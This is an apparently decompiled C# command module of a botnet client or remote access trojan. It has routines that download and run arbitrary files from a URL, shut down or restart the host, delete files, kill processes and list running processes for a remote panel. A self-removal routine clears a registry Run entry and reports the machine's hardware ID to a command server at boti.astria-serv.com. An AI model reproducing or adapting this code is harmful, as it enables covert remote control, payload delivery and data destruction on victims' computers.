using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using network.My;

namespace network;

[StandardModule]
internal sealed class Commandes
{
	internal static void DownloadAndExecute(string link)
	{
		string[] array = link.Split(new char[1] { '/' });
		string text = array[checked(array.Length - 1)];
		WebClient webClient = new WebClient();
		webClient.DownloadFile(link, text);
		Interaction.Shell(text, (AppWinStyle)1, false, -1);
	}

	internal static void OpenProgram(string path)
	{
		Interaction.Shell(path, (AppWinStyle)1, false, -1);
	}

	internal static void Shutdown()
	{
		Interaction.Shell("shutdown -s", (AppWinStyle)2, false, -1);
	}

	internal static void Restart()
	{
		Interaction.Shell("shutdown -r", (AppWinStyle)2, false, -1);
	}

	internal static void DeleteFile(string path)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			fileInfo.Delete();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	internal static void CloseProcess(string name)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName(name);
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	internal static void DeleteMe()
	{
		MyProject.Forms.Main.del_reg_run(Application.get_ProductName());
		WebClient webClient = new WebClient();
		NewLateBinding.LateCall((object)webClient, (Type)null, "DownloadString", new object[1] { Operators.ConcatenateObject((object)"http://boti.astria-serv.com/command.php?a=deleteme&hwid=", MyProject.Forms.Main.Get_HWID()) }, (string[])null, (Type[])null, (bool[])null, true);
		webClient.Dispose();
		ProjectData.EndApp();
	}

	internal static string Get_Process()
	{
		string text = "<fieldset><legend>Process list</legend><div class=\"tableau\"><table>";
		text += "<tr>";
		text += "    <th>PID</th>";
		text += "    <th>Name</th>";
		text += "    <th>Memory</th>";
		text += "    <th>Handles</th>";
		text += "    <th>Threads</th>";
		text += "</tr>";
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			text += "<tr>";
			text = text + "    <td>" + Conversions.ToString(process.Id) + "</td>";
			text = text + "    <td>" + process.ProcessName.ToString() + ".exe</td>";
			text = text + "    <td>" + Conversions.ToString((double)process.WorkingSet64 / 1024.0) + " K</td>";
			text = text + "    <td><center>" + Conversions.ToString(process.HandleCount) + "</center></td>";
			text = text + "    <td><center>" + Conversions.ToString(process.Threads.Count) + "</center></td>";
			text += "</tr>";
		}
		return text + "</div></table></fieldset>";
	}
}
